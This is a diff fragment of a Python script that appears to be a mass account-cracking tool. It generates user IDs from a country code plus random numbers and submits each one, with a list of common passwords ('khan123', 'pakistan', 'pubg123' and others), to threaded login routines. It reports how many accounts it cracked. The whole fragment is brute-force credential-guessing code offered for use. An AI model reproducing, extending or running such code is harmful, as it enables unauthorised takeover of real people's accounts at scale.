+    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
+    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
+    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
+    _________linex_________()
+    topfire = input(f"{style} SELECT METHOD : ")
+    with refatshahriar(max_workers=30) as Refat:
+        clear()
+        tl = str(len(user))
+        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
+        print(f"{style} SELECT CODE {RE}●{G} {kode}")
+        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
+        _________linex_________()
+        for psx in user:
+            ___Main_Uid___ = kode+psx
+            passlist = [psx,___Main_Uid___,'khankhan','khan1122','khan12345','khan123','khanbaba','pakistan','khanzada','malik123','kingkhan','alikhan','janjan','pak123','pubg123']
+            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
+            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
+            elif topfire in ["C","c","3","Three"]:Random()
+            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
+    print("")
+    _________linex_________()
+    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
+    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
+    _________linex_________()
+    input(f"{style} PRESS ENTER TO BACK MAIN MENU....!");___R_E_F_A_T___()
 			
 
 def YounisXyz(uid,pwx,tl):
